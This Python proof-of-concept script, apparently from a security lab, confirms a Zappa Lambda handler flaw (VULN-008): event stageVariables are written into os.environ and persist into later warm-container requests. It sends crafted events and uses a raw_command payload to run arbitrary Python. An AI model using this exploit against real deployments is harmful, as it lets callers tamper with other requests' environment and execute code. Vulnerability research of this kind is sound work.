#!/usr/bin/env python3
"""VULN-008 — event `stageVariables` copied into os.environ, persisting across warm invocations.

Vulnerable code : targets/Zappa/zappa/handler.py:705-709
Vulnerability   : CWE-15 External Control of System/Config Setting (warm-container env pollution).
Surface         : B (direct invoke that sets stageVariables) — persists into later (Surface-A) requests.

Mechanism (plain English)
-------------------------
At the very top of `handler()`, before any dispatch, every event's `stageVariables`
are written into the process environment with no allow-list:

    if event.get("stageVariables"):
        for key in event["stageVariables"]:
            os.environ[key] = event["stageVariables"][key]      # handler.py:707-709

Lambda reuses a warm container across invocations, so a value set by one event
persists into subsequent invocations — including internet-facing (Surface-A) HTTP
requests handled by the same warm container. A direct-invoke caller can thus
pollute the environment other requests run under.

What a successful run proves
----------------------------
Invocation #1 sets a stage variable; a *separate* invocation #2 (reading
os.environ) still sees it — the mutation persisted across invocations.
"""
import os
import secrets
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import banner, lab_exec, log, raw_event, verdict

VULN = "VULN-008"


def main():
    banner(VULN, "stageVariables copied into os.environ (warm-container pollution)",
           "zappa/handler.py:705-709")

    sfx = secrets.token_hex(4)
    key = f"ZAPPA_POLLUTED_{sfx}"
    val = f"set-by-invocation-1-{sfx}"
    marker = f"/tmp/vuln008_{sfx}"

    # Invocation #1: an event carrying stageVariables (no other dispatch keys -> returns None,
    # but the stageVariables loop at handler.py:707 has already run and mutated os.environ).
    log("STEP", f"invocation #1: event with stageVariables {{{key!r}: {val!r}}}")
    raw_event({"stageVariables": {key: val}})

    # Invocation #2: a SEPARATE request that reads os.environ back and writes it out. If invocation #1's
    # stage variable is visible here, it persisted across invocations in the warm container.
    log("STEP", f"invocation #2 (separate request): read os.environ[{key!r}] back via raw_command")
    raw_event({"raw_command": f"import os; open({marker!r},'w').write(os.environ.get({key!r},'<absent>'))"})
    cp = lab_exec(["cat", marker])
    seen = cp.stdout.decode().strip() if cp.returncode == 0 else "<absent>"
    lab_exec(["rm", "-f", marker])
    log("INFO", f"invocation #2 sees {key} = {seen!r}")

    if seen == val:
        log("PROOF", f"the stage variable set by invocation #1 was still present in os.environ during a "
                     f"separate invocation #2 ({key}={seen!r}) — a direct-invoke caller pollutes the warm "
                     f"container's environment, and the mutation bleeds into later (incl. internet-facing) requests.")
        log("OK", "exploit confirmed — stageVariables persist into os.environ across invocations")
        verdict("CONFIRMED", f"{VULN}: CONFIRMED — stageVariables -> os.environ, persists across warm invocations")
        return 0
    log("FAIL", f"env var not observed in invocation #2 (seen={seen!r})")
    verdict("FAILED", f"{VULN}: FAILED")
    return 1


if __name__ == "__main__":
    sys.exit(main())
